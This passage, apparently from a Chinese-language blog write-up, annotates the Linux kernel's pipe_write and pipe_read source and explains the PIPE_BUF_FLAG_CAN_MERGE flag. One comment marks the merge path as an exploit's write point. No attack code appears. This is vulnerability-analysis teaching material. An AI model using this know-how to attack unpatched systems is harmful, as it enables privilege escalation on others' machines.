<code>pipe_write</code> 函数，大概流程如下：</p><ul><li>若管道非空且上一个 buf 未满，则先尝试向上一个被写入的 buffer写入数据（若该 buffer 设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位）</li><li>接下来开始对新的 buffer 进行数据写入，若没有<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位则分配新页面后写入</li><li>循环第二步直到完成写入，若管道满了则会尝试唤醒读者让管道腾出空间</li></ul><p>这里我们可以看出 <code>PIPE_BUF_FLAG_CAN_MERGE</code> <strong>用以标识一个 pipe_buffer 是否已经分配了可以写入的空间</strong>，在大循环中若对应 pipe_buffer 没有设置该 flag（刚被初始化），则会<strong>新分配一个页面供写入，并设置该标志位</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br><span class="hljs-type">ssize_t</span> chars;<br><span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br><span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/* Null write succeeds. */</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<span class="hljs-comment">// 管道没有读者，返回</span><br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>ret = -EPIPE;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>ret = -EXDEV;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若管道非空，我们尝试将新数据合并到最后一个buffer 中</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 这自然会合并小的写操作，但其也会对</span><br><span class="hljs-comment"> * 跨越多个页框的大的写操作的剩余写入操作</span><br><span class="hljs-comment"> * 进行页面对齐</span><br><span class="hljs-comment"> * （译注：大概就是先尝试把数据写到管道的最后一个buffer（如果对应 page 没写满的话））</span><br><span class="hljs-comment"> */</span><br>head = pipe-&gt;head;<span class="hljs-comment">// 获取队列头</span><br>was_empty = pipe_empty(head, pipe-&gt;tail); <span class="hljs-comment">// head == tail</span><br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="hljs-comment">// 管道非空，且上一个 buf 没写满</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask]; <span class="hljs-comment">// 找到上一个 buf</span><br><span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 设置了PIPE_BUF_FLAG_CAN_MERGE标志位，</span><br><span class="hljs-comment">         * 说明该 buffer 可用于直接写入，</span><br><span class="hljs-comment">         * 直接把数据拷贝进去后就返回</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 注：这是漏洞利用的写入点</span><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>    offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>buf-&gt;len += ret;<br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">// 写满 last buffer 对应数据后，接下来将剩余数据写到往后的 buffer 中</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<span class="hljs-comment">// 没有读者，返回</span><br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123; <span class="hljs-comment">// 管道没满，正常写入</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-type">int</span> copied;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<span class="hljs-comment">// 没有预先准备page，分配一个新的</span><br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br><span class="hljs-comment">/* 提前在环中分配一个 slot，并附加一个空 buffer。</span><br><span class="hljs-comment"> * 若我们出错或未能使用它，</span><br><span class="hljs-comment"> * 它会被读者所使用，</span><br><span class="hljs-comment"> * 亦或是保留在这里等待下一次写入。</span><br><span class="hljs-comment"> */</span><br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<span class="hljs-comment">// 管道满了，开启下一次循环</span><br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br>pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br><span class="hljs-comment">/* 将其插入 buffer array 中 */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<span class="hljs-comment">// 设置 buffer 的 flag，若设置了 O_DIRECT 则为 PACKET</span><br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<span class="hljs-comment">// 将数据拷贝到 buffer 对应 page 上</span><br><span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += copied;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = copied;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<span class="hljs-comment">// 读完数据了，退出循环</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<span class="hljs-comment">// 管道没满，继续下一次循环</span><br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/* 等待缓冲区空间可用. */</span><br>        <span class="hljs-comment">// 管道满了，等他变空</span><br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -ERESTARTSYS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们将释放管道的锁，等待（有）更多的空间。</span><br><span class="hljs-comment"> * 若有必要我们将唤醒任意读者，在等待后我们需要重新检查</span><br><span class="hljs-comment"> * 在我们释放锁后管道是否变空了</span><br><span class="hljs-comment"> */</span><br>__pipe_unlock(pipe);<br><span class="hljs-keyword">if</span> (was_empty)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br>__pipe_lock(pipe);<br>was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br>wake_next_writer = <span class="hljs-literal">true</span>;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))<br>wake_next_writer = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若我们进行了一次唤醒事件，我们做一个“同步”唤醒，</span><br><span class="hljs-comment"> * 因为相比起让数据仍旧等待，我们想要让读者去尽快</span><br><span class="hljs-comment"> * 处理事情</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 尤其是，这对小的写操作重要，这是因为（例如）GNU 让</span><br><span class="hljs-comment"> * jobserver 使用小的写操作来唤醒等待的工作</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Epoll 则没有意义地想要一个唤醒，</span><br><span class="hljs-comment"> * 无论管道是否已经空了</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (was_empty || pipe-&gt;poll_usage)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br><span class="hljs-keyword">if</span> (wake_next_writer)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;<br><span class="hljs-type">int</span> err = file_update_time(filp);<br><span class="hljs-keyword">if</span> (err)<br>ret = err;<br>sb_end_write(file_inode(filp)-&gt;i_sb);<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="管道的读出过程">管道的读出过程</h3><p>从管道中读出数据则是通过 <code>pipe_read</code>，主要是读取 buffer 对应 page 上的数据，若一个 buffer 被读完了则将其出列</p><p>原理还是比较简单的，这里就不深入分析了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *to)</span><br>&#123;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(to);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">bool</span> was_full, wake_next_reader = <span class="hljs-literal">false</span>;<br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-comment">/* Null read succeeds. */</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>ret = <span class="hljs-number">0</span>;<br>__pipe_lock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若管道满了，我们只在开始读取时唤醒写者</span><br><span class="hljs-comment"> * 以避免没有必要的唤醒</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 但当我们唤醒写者时，我们使用一个同步唤醒(WF_SYNC)</span><br><span class="hljs-comment"> * 因为我们想要他们行动起来并为我们生成更多数据</span><br><span class="hljs-comment"> */</span><br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head = pipe-&gt;head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (pipe-&gt;note_loss) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification</span> <span class="hljs-title">n</span>;</span><br><br><span class="hljs-keyword">if</span> (total_len &lt; <span class="hljs-number">8</span>) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>n.type = WATCH_TYPE_META;<br>n.subtype = WATCH_META_LOSS_NOTIFICATION;<br>n.info = watch_sizeof(n);<br><span class="hljs-keyword">if</span> (copy_to_iter(&amp;n, <span class="hljs-keyword">sizeof</span>(n), to) != <span class="hljs-keyword">sizeof</span>(n)) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += <span class="hljs-keyword">sizeof</span>(n);<br>total_len -= <span class="hljs-keyword">sizeof</span>(n);<br>pipe-&gt;note_loss = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail)) &#123;<span class="hljs-comment">// 管道非空，逐 buffer 读出数据</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];<br><span class="hljs-type">size_t</span> chars = buf-&gt;len;<br><span class="hljs-type">size_t</span> written;<br><span class="hljs-type">int</span> error;<br><br><span class="hljs-keyword">if</span> (chars &gt; total_len) &#123;<br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>chars = total_len;<br>&#125;<br><br>error = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (error) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = error;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>            <span class="hljs-comment">// 将 buffer 对应 page 数据拷贝出来</span><br>written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);<br><span class="hljs-keyword">if</span> (unlikely(written &lt; chars)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += chars;<br>buf-&gt;offset += chars;<br>buf-&gt;len -= chars;<br><br><span class="hljs-comment">/* 这是一个 packet buffer？清理并退出 */</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;<br>total_len = chars;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<span class="hljs-comment">// buffer 空了，释放</span><br>pipe_buf_release(pipe, buf);<br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)<br>pipe-&gt;note_loss = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>tail++;<span class="hljs-comment">// 被读的 buffer 出队</span><br>pipe-&gt;tail = tail;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br>total_len -= chars;<br><span class="hljs-keyword">if</span> (!total_len)<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">/* 常规路径：读取成功 */</span><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail))<span class="hljs-comment">/* More to do? */</span><br><span class="hljs-keyword">continue</span>;<span class="hljs-comment">// 没读完，还有数据，接着读</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe-&gt;writers)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们只有在确实没读到东西时到达这里</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 然而，我们或许已看到（并移除） 一个 size 为 0 的 buffer，</span><br><span class="hljs-comment"> * 这可能会在 buffers 中创造空间</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 你无法通过一个空写入来制造 size 为 0 的 pipe buffers（packet mode 也不行）</span><br><span class="hljs-comment"> * 但若写者在尝试填充一个已经分配并插入到 buffer 数组中</span><br><span class="hljs-comment"> * 的 buffer 时获得了一个 EFAULT，则这是有可能发生的</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 故我们仍需在【非常】不太可能发生的情况：</span><br><span class="hljs-comment"> * “管道满了，但我们没有获得数据”下</span><br><span class="hljs-comment"> * 唤醒任何等待的写者</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(was_full))<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 但因为我们没有读到任何东西，若我们打断了，则这时候我们可以直接</span><br><span class="hljs-comment"> * 返回一个-ERESTARTSYS，</span><br><span class="hljs-comment"> * 因为我们已经完成了任何所需的环境，没有必要标记任何可访问. </span><br><span class="hljs-comment"> * 且我们已释放了锁。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -ERESTARTSYS;<br><br>__pipe_lock(pipe);<br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>wake_next_reader = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))<br>wake_next_reader = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">if</span> (was_full)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (wake_next_reader)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>file_accessed(filp);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们可以总结：对于一个刚刚建立的管道，其 buffer 数组其实并没有分配对应的页面空间，也没有设置标志位；在我们向管道内写入数据时会通过 buddy system 为对应 buffer 分配新的页框，<strong>并设置 PIPE_BUF_FLAG_CAN_MERGE 标志位，标志该 buffer 